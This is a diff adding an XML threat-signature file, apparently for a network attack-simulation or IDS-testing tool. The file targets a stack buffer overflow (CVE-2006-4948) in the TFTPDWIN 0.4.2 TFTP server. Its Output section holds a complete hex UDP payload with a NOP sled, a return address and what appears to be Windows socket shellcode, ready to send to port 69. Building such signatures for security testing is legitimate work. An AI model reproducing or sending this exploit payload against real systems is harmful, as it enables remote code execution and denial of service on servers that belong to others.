@@ -1,0 +1,77 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="TFTPDWIN 0.4.2 Remote Buffer Overflow Vulnerability"/>
+    <EngDesc display="true" value="This threat leverages a stack-based buffer overflow in TFTPDWIN 0.4.2 and&#13;&#10;earlier that allows for execution of arbitrary code or DoS via a long file name. &#13;&#10;TFTPDWIN is a tftp server that typically listens on udp port 69."/>
+    <Intent display="true">
+      <item value="Buffer_Overflow"/>
+      <item value="Crashing"/>
+      <item value="Denial_of_Service"/>
+    </Intent>
+    <Protocol display="true" value="TFTP"/>
+    <Type_Of_Equipment display="true">
+      <item value="Server"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="ProSysInfo"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="ProSysInfo_TFTPDWIN"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="ProSysInfo_TFTPDWIN_0.4.2"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value="http://www.milw0rm.com/exploits/3132"/>
+    <CVEID display="true" value="CVE-2006-4948"/>
+    <bugtraqID display="true" value="20131"/>
+    <OSVDB display="true" value="29032"/>
+    <Author display="true" value="Mike Davis"/>
+    <ID display="true" value="48bc412dfda9d497e6e75c8c4eb41e7f"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value="true"/>
+    <ServerSideAttack display="true" value="false"/>
+    <SoftwareRevision display="true" value="2.0"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value="false"/>
+    <Valid_Traffic display="false" value="true"/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value="low"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="partial"/>
+    <IntegImpact display="false" value="partial"/>
+    <AvailImpact display="false" value="complete"/>
+    <ImpactBias display="false" value="availability"/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="633045955646093750"/>
+    <SigStyle display="false" value=""/>
+    <targetNode display="false" value=""/>
+    <SigProtocol display="false" value=""/>
+    <Rate display="false" value=""/>
+    <Regex display="false" value=""/>
+    <Created value="1169760594" display="true"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="A"/>
+    <NamedVar name="sourceMAC" type="ImperfectControls.MacAddress" value="null" index="B"/>
+    <NamedVar name="sourceIP" type="ImperfectControls.IPv4Address" value="null" index="C"/>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="D"/>
+    <NamedVar name="TFTPdestPort" type="ImperfectControls.Port" value="null" index="G"/>
+  </Variables>
+  <Loops>
+    <for index="E">
+      <for index="B"/>
+      <for index="A"/>
+      <for index="C"/>
+      <for index="D"/>
+      <for index="G"/>
+    </for>
+  </Loops>
+  <PostScript/>
+  <Output index="E" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IP Version="4" InternetHeaderLength="" TypeofService="" TotalLength="" Identification="" FragmentOffset="" TTL="" Protocol="11" HeaderChecksum="" srcIP="$sourceIP" destIP="$destIP" options="" CE="" DF="" MF="">
+        <UDP srcPort="@random(1026,65535)" destPort="$TFTPdestPort" checksum="" length="" Payload="00019090909090909090909090909090908BC36605120150C39090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090905981C9D362302041434D646499968D7EE8648B5A308B4B0C8B491C8B098B6908B6032BE266BA333252687773325F54AC3CD3750695FF57F49557608B453C8B4C057803CD8B592003DD33FF478B34BB03F599AC34712AD03C7175F73A54241C75EA8B592403DD668B3C7B8B591C03DD032CBB955FAB57613BF775B45E546A02ADFFD08846138D48308BFCF3AB40504050ADFFD095B802FF115C32E4505455ADFFD085C074F8FE44242DFE44242C83EF6CABABAB5854545050505450505650FF56E4FF56E89090909090909042FB6140006E6574617363696900"/>
+      </IP>
+    </Ethernet>
+  </Output>
+</threatSignature>
